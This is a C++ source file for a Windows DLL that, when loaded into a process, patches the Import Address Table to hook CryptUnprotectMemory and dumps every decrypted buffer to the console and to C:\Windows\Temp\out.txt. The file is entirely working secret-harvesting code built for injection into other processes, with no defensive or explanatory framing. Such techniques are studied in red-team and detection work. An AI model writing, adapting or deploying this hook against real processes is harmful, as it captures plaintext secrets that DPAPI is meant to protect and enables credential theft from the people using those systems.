// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Windows.h"
#include "stdio.h"
#include <dbghelp.h>
#include "dpapi.h"
#define WIN32_LEAN_AND_MEAN
#pragma comment(lib, "user32.lib")
#pragma comment (lib, "dbghelp.lib")
#include <iostream>
#include <fstream>
using namespace std;
#pragma comment (lib, "Crypt32.lib")
#include <vector>

BOOL(WINAPI* pOrigUnprotectMem)(
	LPVOID pDataIn,
	DWORD  cbDataIn,
	DWORD  dwFlags
	) = CryptUnprotectMemory;

BOOL HookedUnprotectMemory(
	LPVOID pDataIn,
	DWORD cbDataIn,
	DWORD dwFlags
) {
	// Call the original unprotect memory function (assuming it exists)
	BOOL result = pOrigUnprotectMem(pDataIn, cbDataIn, dwFlags);

	// Cast pDataIn to char* to access the data
	char* charData = static_cast<char*>(pDataIn);

	// Prepare buffer for writing
	std::vector<char> buff(charData, charData + cbDataIn);  // Use vector to copy the data correctly

	std::cout << "Buffer contents: ";
	for (char c : buff) {
		std::cout << c;  // Print each character to console
	}
	std::cout << std::endl;

	buff.push_back(0x00);
	// Create and open a text file
	ofstream MyFile("C:\\Windows\\Temp\\out.txt");

	// Write to the file
	MyFile << buff.data(); 

	// Close the file
	MyFile.close();
	return result;
}


BOOL Hookem(char* dll, char* origFunc, PROC hookingFunc) {

	ULONG size;
	DWORD i;
	BOOL found = FALSE;

	// get a HANDLE to a main module == BaseImage
	HANDLE baseAddress = GetModuleHandle(NULL);

	// get Import Table of main module
	PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToDataEx(
		baseAddress,
		TRUE,
		IMAGE_DIRECTORY_ENTRY_IMPORT,
		&size,
		NULL);

	// find imports for target dll 
	for (i = 0; i < size; i++) {
		char* importName = (char*)((PBYTE)baseAddress + importTbl[i].Name);
		if (_stricmp(importName, dll) == 0) {
			found = TRUE;
			break;
		}
	}
	if (!found)
		return FALSE;

	// Optimization: get original address of function to hook 
	// and use it as a reference when searching through IAT directly

	PROC origFuncAddr = (PROC)GetProcAddress(GetModuleHandleA(dll), origFunc);

	// Search IAT
	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)baseAddress + importTbl[i].FirstThunk);
	while (thunk->u1.Function) {
		PROC* currentFuncAddr = (PROC*)&thunk->u1.Function;

		// found
		if (*currentFuncAddr == origFuncAddr) {

			// make sure memory is writable
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID)currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

			// set the hook
			*currentFuncAddr = (PROC)hookingFunc;

			// revert protection setting back
			VirtualProtect((LPVOID)currentFuncAddr, 4096, oldProtect, &oldProtect);

			printf("IAT function %s() hooked!\n", origFunc);
			return TRUE;
		}
		thunk++;
	}

	return FALSE;
}

void HookSetup() {
    char user32[] = "user32.dll";
    char cr32[] = "Crypt32.dll";
    char m[] = "MessageBoxA";
	char decrypt[] = "CryptUnprotectMemory";

   // Hookem(user32, m, (PROC)HookedMessage);
	Hookem(cr32, decrypt, (PROC)HookedUnprotectMemory); 
	printf("Hooked installed\n");
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        HookSetup();

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

